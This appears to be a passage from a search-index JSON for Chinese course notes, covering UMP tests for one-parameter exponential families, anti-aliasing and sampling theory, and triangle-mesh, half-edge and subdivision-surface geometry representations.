\\tag{3.2} \\] <p>\u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u82e5\u200b \\(\\mathcal{W}\\) \u200b\u8fd8\u200b\u6ee1\u8db3\u6761\u4ef6\u200b:</p> \\[ \\beta_{\\mathcal{W}}(\\theta)\\leq\\alpha(\\theta\\in\\Theta_0) \\tag{3.3} \\] <p>\u200b\u90a3\u4e48\u200b\u5b83\u200b\u4e5f\u200b\u662f\u200b\u4e0a\u8ff0\u200b (3.1) \u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>\u200b\u8bc1\u660e\u200b: - \u200b\u9996\u5148\u200b, \u200b\u6839\u636e\u200b (3.3) \\(\\mathcal{W}\\) \u200b\u662f\u200b (3.1) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b.  - \u200b\u5982\u679c\u200b (3.1) \u200b\u6709\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b \\(\\widetilde{\\mathcal{W}}\\), \u200b\u5b83\u200b\u4e5f\u200b\u662f\u200b\u68c0\u9a8c\u200b\u95ee\u9898\u200b (3.2) \u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b. (3.2\u200b\u662f\u200b\u53d6\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5355\u70b9\u200b,\u200b\u5b83\u200b\u72af\u9519\u200b\u7684\u200b\u6982\u7387\u200b\u80af\u5b9a\u200b\u5c0f\u4e8e\u200b \\(\\alpha\\))  - \u200b\u7531\u4e8e\u200b \\(\\mathcal{W}\\) \u200b\u662f\u200b (3.2) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u6240\u4ee5\u200b\u80af\u5b9a\u200b\u6709\u200b    $$      \\beta_{\\mathcal{W}}(\\theta_1)\\geq\\beta_{\\widetilde{\\mathcal{W}}}(\\theta_1)    $$  - \u200b\u6240\u4ee5\u200b \\(\\mathcal{W}\\) \u200b\u4e5f\u200b\u662f\u200b (3.1) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b</p> <p>\u200b\u8fd9\u4e2a\u200b\u5b9a\u7406\u200b\u5de7\u5999\u200b\u5730\u200b\u5c06\u200b UMP \u200b\u7684\u200b\u9a8c\u8bc1\u200b\u4ece\u200b \\(\\Theta_0\\) \u200b\u8f6c\u79fb\u200b\u5230\u200b\u4e86\u200b \\(\\theta_0\\) \u200b\u5e94\u7528\u200b\u8fd9\u4e2a\u200b\u5b9a\u7406\u200b\u7684\u200b\u56f0\u96be\u200b\u662f\u200b \\(\\theta_0\\) \u200b\u5f88\u96be\u200b\u627e\u200b, (3.3) \u200b\u7684\u200b\u6761\u4ef6\u200b\u4e5f\u200b\u5f88\u200b\u96be\u200b\u9a8c\u8bc1\u200b.</p> <p>(3.1) \u200b\u662f\u200b\u590d\u6742\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u7684\u200b\u7279\u4f8b\u200b, \u200b\u4e0b\u9762\u200b\u662f\u200b\u66f4\u200b\u4e00\u822c\u200b\u7684\u200b\u95ee\u9898\u200b:</p> \\[ H_0:\\theta\\in\\Theta_0\\leftrightarrow H_1:\\theta\\in\\Theta_1 \\tag{3.4} \\] <p>\u200b\u8fd9\u91cc\u200b\u4e24\u4e2a\u200b\u96c6\u5408\u200b\u90fd\u200b\u4e0d\u518d\u200b\u662f\u200b\u5355\u70b9\u200b\u96c6\u200b\u4e86\u200b. \u200b\u5bf9\u4e8e\u200b\u8fd9\u6837\u200b\u7684\u200b\u95ee\u9898\u200b, \u200b\u6709\u200b\u5982\u4e0b\u200b\u5b9a\u7406\u200b:</p> <p>(\u200b\u5b9a\u7406\u200b3.2) \u200b\u82e5\u200b\u5bf9\u4e8e\u200b \\(\\Theta_1\\) \u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u5355\u70b9\u200b \\(\\theta_1\\) , \u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b (3.1) \u200b\u5b58\u5728\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b \\(\\mathcal{W}\\) , \u200b\u800c\u4e14\u200b\u5b83\u200b\u4e0d\u200b\u4f9d\u8d56\u4e8e\u200b \\(\\theta_1\\in\\Theta_1\\)(\u200b\u5bf9\u4e8e\u200b\u6240\u6709\u200b \\(\\theta_1\\) \u200b\u90fd\u200b\u662f\u200b\u8fd9\u4e2a\u200b), \u200b\u5219\u200b \\(\\mathcal{W}\\) \u200b\u4e5f\u200b\u662f\u200b (3.4) \u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b\u7c7b\u4f3c\u200b, \u200b\u90fd\u200b\u662f\u200b\u5229\u7528\u200b\u53d6\u200b\u5b9a\u5355\u200b\u70b9\u200b\u628a\u200b UMP \u200b\u7684\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u8f6c\u79fb\u200b\u5230\u200b\u5355\u70b9\u200b\u4e0a\u200b.</p> <p>\u200b\u4e0b\u9762\u200b\u6307\u51fa\u200b\u5bf9\u4e8e\u200b\u4e00\u7c7b\u200b\u5355\u200b\u53c2\u6570\u200b\u6307\u6570\u200b\u65cf\u200b\u5206\u5e03\u200b, \u200b\u6709\u200b\u53ef\u80fd\u200b\u5229\u7528\u200b\u4e0a\u8ff0\u200b\u5b9a\u7406\u200b\u627e\u5230\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>\u200b\u5982\u679c\u200b\u5206\u5e03\u200b\u5bc6\u5ea6\u200b\u53ef\u4ee5\u200b\u5206\u89e3\u6210\u200b\u5982\u4e0b\u200b\u5f62\u5f0f\u200b:</p> \\[f(\\mathbf{x}, \\theta) = S(\\theta)h(\\mathbf{x})\\exp\\{C(\\theta)T(\\mathbf{x})\\} \\quad (\\theta \\in \\Theta), \\quad (3.6)\\] <p>\u200b\u5176\u4e2d\u200b \\(C(\\theta)\\) \u200b\u4e3a\u200b \\(\\theta\\) \u200b\u7684\u200b\u4e25\u683c\u200b\u589e\u51fd\u6570\u200b, \u200b\u90a3\u4e48\u200b\u5c31\u200b\u79f0\u200b \\(\\{f(x,\\theta),\\theta\\in\\Theta\\}\\) \u200b\u6784\u6210\u200b\u5355\u200b\u53c2\u6570\u200b\u6307\u6570\u200b\u65cf\u200b.</p> <p>\u200b\u663e\u7136\u200b, \u200b\u5982\u679c\u200b \\(\\theta\\) \u200b\u8d8a\u5927\u200b, \u200b\u76f8\u5e94\u200b\u7684\u200b \\(L(x,\\theta)\\) \u200b\u4e5f\u200b\u5c31\u200b\u8d8a\u200b\u5927\u200b.</p> <p>\u200b\u73b0\u5728\u200b\u8003\u8651\u200b\u5355\u200b\u53c2\u6570\u200b\u6307\u6570\u200b\u65cf\u200b\u5206\u5e03\u200b\u4e2d\u200b\u5982\u4e0b\u200b\u7684\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\uff1a</p> \\[H_0: \\theta \\le \\theta_0 \\leftrightarrow H_1: \\theta &gt; \\theta_0 \\tag{3.9}\\] <p>(\u200b\u79f0\u6b64\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u4e3a\u200b\u5355\u8fb9\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u3002\u200b\u540c\u6837\u200b\uff0c\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b \\(H_0: \\theta \\ge \\theta_0 \\leftrightarrow H_1: \\theta &lt; \\theta_0\\) \u200b\u4e5f\u200b\u79f0\u4e3a\u200b\u5355\u8fb9\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b)</p> <p>\u200b\u76f8\u5e94\u200b\u5730\u200b\uff0c\u200b\u79f0\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b</p> \\[H_0: \\theta = \\theta_0 \\leftrightarrow H_1: \\theta \\ne \\theta_0\\] <p>\u200b\u4e3a\u200b\u53cc\u8fb9\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u3002\u200b\u5229\u7528\u200b\u5b9a\u7406\u200b 3.1\u3001\u200b\u5b9a\u7406\u200b 3.2 \u200b\u548c\u200b\u5b9a\u7406\u200b 3.3\uff0c\u200b\u53ef\u200b\u5f97\u5230\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b (3.9) \u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b\u3002</p> <p>\u200b\u8bbe\u200b \\(\\mathbf{X}\\) \u200b\u7684\u200b\u5206\u5e03\u200b\u65cf\u200b \\(\\{f(\\mathbf{x}, \\theta), \\theta \\in \\Theta\\}\\) \u200b\u4e3a\u5355\u200b\u53c2\u6570\u200b\u6307\u6570\u200b\u65cf\u200b\uff0c\u200b\u53c8\u200b\u8bbe\u200b \\(\\mathbf{X} = (X_1, \\dots, X_n)\\) \u200b\u4e3a\u200b\u6765\u81ea\u200b \\(\\mathbf{X}\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b\u3002\u200b\u8bb0\u200b</p> \\[\\mathcal{W} = \\left\\{\\mathbf{x}: \\sum_{i=1}^n T(x_i) &gt; c \\right\\},\\] <p>\u200b\u5176\u4e2d\u200b \\(c\\) \u200b\u4e3a\u200b\u4efb\u4e00\u200b\u5e38\u6570\u200b\u3002\u200b\u53ea\u8981\u200b \\(\\alpha = P_{\\theta_0}(\\mathbf{X} \\in \\mathcal{W}) \\ne 0\\)\uff0c\u200b\u5219\u200b \\(\\mathcal{W}\\) \u200b\u5c31\u662f\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b (3.9) \u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b\u3002</p> <p>\u200b\u6838\u5fc3\u200b\u5c31\u662f\u200b\u5229\u7528\u200b \\(\\beta_{\\mathcal{W}}\\) \u200b\u7684\u200b\u975e\u51cf\u200b\u6027\u8d28\u200b, \u200b\u53ea\u8981\u200b \\(\\theta_0\\) \u200b\u7684\u200b\u65f6\u5019\u200b\u72af\u9519\u200b\u6982\u7387\u200b\u7b49\u4e8e\u200b \\(\\alpha\\), \u200b\u90a3\u4e48\u200b\u53c2\u6570\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b \\(\\theta_0\\) \u200b\u7684\u200b\u65f6\u5019\u200b\u72af\u9519\u200b\u6982\u7387\u200b\u80af\u5b9a\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b \\(\\alpha\\). \u200b\u6240\u4ee5\u200b\u5b83\u200b\u662f\u200b (3.9) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b \\(\\theta_0&lt;\\theta_1\\), \u200b\u8003\u8651\u200b\u7b80\u5355\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b \\((\\theta_0,\\theta_1)\\), \u200b\u4f3c\u7136\u6bd4\u200b\u5426\u5b9a\u200b\u57df\u200b\u6839\u636e\u200b\u6307\u6570\u200b\u65cf\u200b\u5206\u5e03\u200b\u7684\u200b\u6027\u8d28\u200b\u5fc5\u7136\u200b\u53ef\u4ee5\u200b\u5316\u4e3a\u200b  \\(\\{\\boldsymbol{x}:\\sum T(x_i)&gt;c\\}\\) \u200b\u7684\u200b\u5f62\u5f0f\u200b, \\(\\mathcal{W}\\) \u200b\u6b63\u662f\u200b\u5b83\u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b. \u200b\u800c\u4e14\u200b\u4e0e\u200b \\(\\theta_1\\) \u200b\u7684\u200b\u9009\u53d6\u200b\u65e0\u5173\u200b. \u200b\u7531\u200b\u5b9a\u7406\u200b 3.2 \u200b\u77e5\u9053\u200b\u5b83\u200b\u4e5f\u200b\u662f\u200b (3.9) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>\u200b\u5982\u4f55\u200b\u7406\u89e3\u200b\u4f3c\u7136\u6bd4\u200b\u5426\u5b9a\u200b\u57df\u200b\u5fc5\u7136\u200b\u53ef\u4ee5\u200b\u5316\u4e3a\u200b\u7edf\u8ba1\u200b\u91cf\u200b&gt;c\u200b\u7684\u200b\u5f62\u5f0f\u200b</p> <p>\u200b\u53ea\u8981\u200b\u6ee1\u8db3\u200b\u4e86\u200b \\(P_{\\theta_0}(\\boldsymbol{x}\\in\\mathcal{W})=\\alpha\\), \u200b\u5bf9\u4e8e\u200b\u5177\u4f53\u200b\u7684\u200b\u95ee\u9898\u200b\u56e0\u4e3a\u200b\u4f3c\u7136\u200b\u51fd\u6bd4\u200b\u51fd\u6570\u200b\u5173\u4e8e\u200b \\(\\theta\\) \u200b\u662f\u200b\u5355\u8c03\u200b\u7684\u200b, \u200b\u5bf9\u4e8e\u200b\u7b80\u5355\u200b\u68c0\u9a8c\u200b\u95ee\u9898\u200b\\((\\theta_0,\\theta_1)\\) \u200b\u6211\u4eec\u200b\u603b\u80fd\u200b\u901a\u8fc7\u200b\u4ee3\u6362\u200b\u5f97\u5230\u200b\u4f3c\u7136\u6bd4\u200b\u5927\u4e8e\u200b\u67d0\u4e2a\u200b\u5e38\u6570\u200b\u7684\u200b\u5f62\u5f0f\u200b, \u200b\u8fd9\u4e2a\u200b\u5e38\u6570\u200b\u4e0e\u200b\u5177\u4f53\u200b\u7684\u200b \\(\\theta_0, \\theta_1\\) \u200b\u6709\u5173\u200b.</p>"},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/","title":"Chapter 07 Anti aliasing","text":""},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/#1","title":"1. \u200b\u4ea7\u751f\u200b\u539f\u56e0","text":"<p>\u200b\u79bb\u6563\u200b\u7684\u200b\u91c7\u6837\u200b\u65e0\u6cd5\u200b\u6355\u6349\u200b\u8fde\u7eed\u200b\u51e0\u4f55\u200b\u53d8\u5316\u200b (\u200b\u4e0d\u591f\u200b\u7a20\u5bc6\u200b).  \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u5bf9\u200b\u9891\u7387\u200b\u8f83\u200b\u4f4e\u200b\u7684\u200b\u4fe1\u53f7\u200b\u8fdb\u884c\u200b\u79bb\u6563\u200b\u91c7\u6837\u200b\u53ef\u4ee5\u200b\u5927\u81f4\u200b\u53cd\u5e94\u200b\u4fe1\u53f7\u200b\u7684\u200b\u5f62\u72b6\u200b, \u200b\u4f46\u200b\u968f\u7740\u200b\u9891\u7387\u200b\u589e\u52a0\u200b, \u200b\u5230\u200b \\(f_5\\) \u200b\u79bb\u6563\u200b\u4fe1\u53f7\u200b\u548c\u200b\u8fde\u7eed\u200b\u4fe1\u53f7\u200b\u5c31\u200b\u5f88\u200b\u4e0d\u200b\u4e00\u6837\u200b\u4e86\u200b. \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u79bb\u6563\u200b\u4fe1\u53f7\u200b\u662f\u200b\u4ee5\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u4e8e\u200b\u8fde\u7eed\u200b\u4fe1\u53f7\u200b\u7684\u200b\u9891\u7387\u200b\u5728\u200b\u632f\u8361\u200b\uff0c\u200b\u4e5f\u200b\u5373\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u6469\u5c14\u200b\u7eb9\u200b.</p>"},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/#2","title":"2. \u200b\u4fe1\u53f7\u200b\u5206\u6790","text":""},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/#21","title":"2.1 \u200b\u5085\u91cc\u53f6\u200b\u53d8\u6362","text":"<p>\u200b\u5047\u8bbe\u200b\u6211\u4eec\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u4e3a\u200b\u00a0\\(T\\)\u00a0(\u200b\u9891\u7387\u200b\u4e3a\u200b\u00a0\\(\\frac{1}{T}\\) )\u200b\u7684\u200b\u5468\u671f\u51fd\u6570\u200b, \u200b\u6bd4\u5982\u200b\u65b9\u200b\u6ce2\u51fd\u6570\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u9891\u7387\u200b\u4e3a\u200b\u00a0\\(\\frac{1}{T}\\)\u00a0\u200b\u6574\u200b\u500d\u6570\u200b\u7684\u200b\u6b63\u5f26\u200b\u548c\u200b\u4f59\u5f26\u200b\u51fd\u6570\u200b\uff08\u200b\u7edf\u79f0\u200b\u4e3a\u200b\u7b80\u8c10\u200b\u51fd\u6570\u200b\uff09\u200b\u52a0\u200b\u548c\u200b\u8fd1\u4f3c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u79f0\u4e3a\u200b\u5468\u671f\u51fd\u6570\u200b\u7684\u200b\u5085\u91cc\u53f6\u200b\u5c55\u5f00\u200b. </p> <p>\u200b\u4ece\u200b\u7ebf\u6027\u4ee3\u6570\u200b\u7684\u200b\u89c6\u89d2\u200b\u770b\u200b, \u200b\u5085\u91cc\u53f6\u200b\u53d8\u6362\u200b\u76f8\u5f53\u4e8e\u200b\u505a\u200b\u4e86\u200b\u4e00\u7ec4\u200b\u57fa\u200b\u53d8\u6362\u200b.</p> <p>\u200b\u9996\u5148\u200b, \u200b\u6211\u4eec\u200b\u5f15\u5165\u200b \\(\\delta\\) \u200b\u51fd\u6570\u200b.</p> \\[ \\delta(x)= \\begin{cases} 0, &amp; x\\neq0 \\\\ +\\infty, &amp;x =0 \\\\ \\end{cases}  $$ $$ \\int_{-\\infty}^{+\\infty}\\delta(x)\\mathrm{d}x=1 \\] <p>\u200b\u663e\u7136\u200b \\(\\delta\\) \u200b\u51fd\u6570\u200b\u6709\u200b\u5f88\u200b\u597d\u200b\u7684\u200b\u5e73\u79fb\u200b\u6027\u8d28\u200b, \\(\\delta(x-t)\\) \u200b\u5c31\u662f\u200b\u503c\u200b\u96c6\u4e2d\u200b\u5728\u200b \\(x=t\\) \u200b\u5904\u200b\u7684\u200b\u51fd\u6570\u200b.</p> <p>\u200b\u5728\u200b\u539f\u672c\u200b\u7684\u200b\u65f6\u57df\u200b\u7a7a\u95f4\u200b\u4e0b\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u4fe1\u53f7\u200b\u7406\u89e3\u200b\u6210\u5bf9\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u65f6\u95f4\u200b\u70b9\u200b \\(t=t_0\\) \u200b\u7684\u200b\u91c7\u6837\u200b, \u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5c06\u200b \\(f(x)\\) \u200b\u7528\u200b\u4e00\u7ec4\u200b\u65f6\u57df\u200b\u57fa\u200b\u8868\u793a\u200b:</p> <p>$$ f(x)=\\int_{-\\infty}^{+\\infty}f(t)\\delta(x-t)dt $$ \u200b\u76f8\u5e94\u200b\u7684\u200b\u57fa\u662f\u200b \\(\\delta(x-t),t\\in \\mathbb{R}\\), \u200b\u5bf9\u5e94\u200b\u7684\u200b\u7ec4\u5408\u200b\u7cfb\u6570\u200b\u662f\u200b \\(f(t)\\)  \u200b\u9891\u7387\u200b\u57fa\u200b \\(\\{e^{2\\pi i\\omega x}\\}_{\\omega \\in \\mathbb{R}}\\)  \u200b\u662f\u200b\u4e00\u7ec4\u200b\u5e7f\u4e49\u200b\u6b63\u4ea4\u200b\u57fa\u200b, \u200b\u5728\u200b\u5176\u200b\u4e0a\u200b\u7684\u200b\u7cfb\u6570\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u4e0e\u5176\u200b\u505a\u200b\u5185\u79ef\u200b, \u200b\u5373\u200b\u4e0a\u9762\u200b\u7684\u200b \\(F(\\omega)\\).</p> <p>Note</p> <p>\u200b\u6ce8\u200b: \u200b\u51fd\u6570\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5185\u79ef\u200b\u5b9a\u4e49\u200b\u4e3a\u200b: $$ (f,g) = \\int_{-\\infty}^{+\\infty}f(x)\\overline{g(x)}\\mathrm{d}x $$</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b, \u200b\u5982\u679c\u200b \\(f(x)\\) \u200b\u662f\u200b\u5468\u671f\u51fd\u6570\u200b, \\(f(x)\\) \u200b\u53ef\u4ee5\u200b\u7528\u200b\u53ef\u200b\u6570\u4e2a\u200b\u51fd\u6570\u200b\u7ebf\u6027\u8868\u200b\u51fa\u200b, \u200b\u8fd9\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u5085\u91cc\u53f6\u200b\u7ea7\u6570\u200b:</p> <p></p> <p>Warning</p> <p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u4e25\u683c\u200b\u7684\u200b\u6570\u5b66\u200b, \u200b\u5177\u4f53\u200b\u4e25\u683c\u200b\u5206\u6790\u200b\u9700\u8981\u200b\u6df1\u5165\u200b\u5b66\u4e60\u200b\u6cdb\u51fd\u200b\u7b49\u200b\u77e5\u8bc6\u200b</p>"},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/#22","title":"2.2 \u200b\u91c7\u6837\u200b\u7406\u8bba","text":"<p>\u200b\u5229\u7528\u200b\u5085\u91cc\u53f6\u200b\u7684\u200b\u5377\u79ef\u5b9a\u7406\u200b\u53ef\u4ee5\u200b\u8bc1\u660e\u200b, \u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u8fde\u7eed\u51fd\u6570\u200b \\(f(x)\\) \u200b\u4ee5\u200b \\(f_s\\) \u200b\u7684\u200b\u9891\u7387\u200b\u91c7\u6837\u200b, \u200b\u6700\u7ec8\u200b\u5f97\u5230\u200b\u7684\u200b\u79bb\u6563\u200b\u51fd\u6570\u200b\u7684\u200b\u9891\u8c31\u200b\u662f\u200b\u628a\u200b \\(f(x)\\) \u200b\u7684\u200b\u9891\u8c31\u200b \\(F(\\omega)\\) \u200b\u5728\u200b\u6bcf\u9694\u200b \\(f_s\\) \u200b\u7684\u200b\u5730\u65b9\u200b\u590d\u5236\u200b\u4e00\u4efd\u200b.  \u200b\u56e0\u6b64\u200b, \u200b\u8bb0\u200b\u51fd\u6570\u200b\u6700\u5927\u200b\u9891\u7387\u200b\u4e3a\u200b \\(f_0\\) , \u200b\u53ea\u8981\u200b \\(f_s&gt;2f_0\\) \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6062\u590d\u539f\u200b\u4fe1\u53f7\u200b. \u200b\u53cd\u4e4b\u200b\u5219\u200b\u4f1a\u200b\u53d1\u751f\u200b\u9891\u8c31\u200b\u7684\u200b\u4ea4\u53e0\u200b, \u200b\u4e5f\u200b\u5c31\u662f\u200b\u8d70\u6837\u200b: </p> <p>\u200b\u9891\u8c31\u200b\u7684\u200b\u5171\u8f6d\u200b\u5bf9\u79f0\u6027\u200b</p> <p>\u200b\u5229\u7528\u200b\u5085\u91cc\u53f6\u200b\u53d8\u6362\u200b\u8ba1\u7b97\u200b \\(F(\\omega), F(-\\omega), \\overline{F(\\omega)}\\) \u200b\u53ef\u77e5\u200b: $$ F(-\\omega)=\\overline{F(\\omega)} $$</p>"},{"location":"notes/VCI/Chapter%2007%20Anti-aliasing/#3-super-sampling","title":"3. \u200b\u53cd\u200b\u8d70\u6837\u200b: super-sampling","text":"<p>\u200b\u4e24\u79cd\u200b\u7b56\u7565\u200b: - \u200b\u5148\u200b\u505a\u200b low-pass filtering , \u200b\u518d\u8d85\u200b\u91c7\u6837\u200b - \u200b\u5148\u8d85\u200b\u91c7\u6837\u200b, \u200b\u518d\u200b\u505a\u200b low-pass filtering</p> <p></p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/","title":"Chapter 08 Geometry Representations","text":""},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#1-how-to-encode-geometry-on-a-computer","title":"1. How to encode geometry on a computer","text":"<p>\u200b\u663e\u793a\u200b\u8868\u8fbe\u200b: - \u200b\u70b9\u4e91\u200b - Polygon mesh - Subdivision surface - ... \u200b\u9690\u5f0f\u200b\u8868\u8fbe\u200b: - Level set - Algebraic surface</p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#2-triangle-mesh","title":"2. Triangle mesh","text":"<ul> <li>\u200b\u4fdd\u5b58\u200b\u4e09\u89d2\u5f62\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u9876\u70b9\u200b \\(P_i=(x,y,z)\\)</li> <li>\u200b\u7528\u70b9\u200b\u7684\u200b\u7d22\u5f15\u200b\u6784\u6210\u200b\u7684\u200b\u4e09\u5143\u7ec4\u200b\u8868\u793a\u200b\u4e00\u4e2a\u200b\u4e09\u89d2\u5f62\u200b \\((i,j,k)\\)</li> <li>\u200b\u66f4\u200b\u4e00\u822c\u200b\u5730\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b vertex table, edge table, polygon-surface table \u200b\u6784\u5efa\u200b </li> <li>\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u200b List of triangles \u200b\u7684\u200b\u65b9\u6cd5\u200b, \u200b\u6bcf\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u4fdd\u5b58\u200b\u4e09\u4e2a\u200b\u9876\u70b9\u200b\u7684\u200b\u5750\u6807\u200b. </li> </ul> <p>Comparison: \u200b\u7528\u200b List of triangles \u200b\u8868\u8fbe\u200b - \u200b\u7b80\u5355\u200b  - \u200b\u5305\u542b\u200b\u592a\u200b\u591a\u200b\u5197\u4f59\u200b\u4fe1\u606f\u200b(\u200b\u91cd\u590d\u200b\u70b9\u200b)</p> <p>\u200b\u7528\u200b List of vertices + List of indexed triangles - \u200b\u7a7a\u95f4\u200b\u82b1\u8d39\u200b\u5c0f\u200b - \u200b\u590d\u6742\u200b</p> <p>\u200b\u5982\u4f55\u200b\u627e\u200b\u76f8\u90bb\u200b\u4e09\u89d2\u5f62\u200b? \u200b\u6839\u636e\u200b Triangle Edge list, \u200b\u5047\u8bbe\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b (vi, vj, t) \u200b\u8868\u793a\u200b\u4e09\u89d2\u5f62\u200b t \u200b\u7684\u200b\u4e00\u6761\u200b\u8fde\u63a5\u200b vi, vj \u200b\u7684\u200b\u8fb9\u200b. \u200b\u5c06\u8fb9\u200b\u6392\u5e8f\u200b\u540e\u200b, \u200b\u5982\u679c\u200b\u76f8\u90bb\u200b\u5219\u200b\u4f1a\u200b\u6709\u200b\u91cd\u590d\u200b\u7684\u200b vi, vj. \u200b\u4f8b\u5982\u200b\u6709\u200b (vi, vj, t1), (vi, vj, t2), t1 \u200b\u4e0e\u200b t2 \u200b\u5c31\u662f\u200b\u76f8\u90bb\u200b\u4e09\u89d2\u5f62\u200b</p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#3-half-edge-data-structure","title":"3. Half-edge data structure","text":"<p>  \u200b\u5229\u7528\u200b\u534a\u8fb9\u200b\u7ed3\u6784\u200b, \u200b\u53ef\u4ee5\u200b\u5f88\u200b\u5bb9\u6613\u200b\u5904\u7406\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b: </p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#4-pros-and-cons-of-polygon-surface","title":"4. Pros and Cons of polygon surface","text":"<ul> <li>Good: Simple, fast in rendering and processing</li> <li>Bad: Need much more surfaces to present smooth curved surfaces</li> </ul>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#5-subdivision-surface","title":"5. Subdivision surface","text":"<p>Key idea: \u200b\u5229\u7528\u200b\u4e0d\u65ad\u200b\u7ec6\u5206\u200b\u7f51\u683c\u200b\u903c\u8fd1\u200b\u8fde\u7eed\u200b\u7684\u200b\u66f2\u9762\u200b. </p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#51-catmull-clark-vertex-update-rules","title":"5.1 Catmull-Clark vertex update rules","text":"<ol> <li>Add new face point, new edge point </li> <li>Update Vertex point (n: number of neighbor edges) </li> 